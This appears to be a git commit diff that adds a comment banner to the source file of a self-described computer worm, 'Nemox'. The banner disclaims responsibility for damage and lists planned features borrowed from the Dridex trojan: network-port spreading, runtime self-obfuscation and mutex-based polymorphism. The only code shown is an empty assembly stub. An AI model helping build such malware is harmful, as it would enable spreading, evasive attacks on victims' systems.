42db141abbd7081fd802216c66ed2d2819f8b52b
Timo S <58859419+timo-cmd@users.noreply.github.com>
2020-12-21 15:23:11 +0100

    added header banner

--- sources/worm.asm
+++ sources/worm.asm
@@ -1,3 +1,21 @@
+;   This file is part of the Nemox computer worm
+;   
+;   I am not responsible for any kind of damage 
+;   that is done via Nemox.
+;
+;   The development of Nemox will last at least
+;   some weeks cuz ASM is pretty new ro me but
+;   I think I'll manage it.
+;
+;   The Nemox computer worm will feature some concepts
+;   borrowed from the Dridex trojan such as:
+;       - Spreading via local Network Ports
+;       - Self-obfuscation while runtime
+:       - Polymorphism via mutex naming
+;    This is everything... Yeah! Nemox is meant to be 
+;    simple but aggressive as hell...
+;    
+;
 section .text
 global _start
 
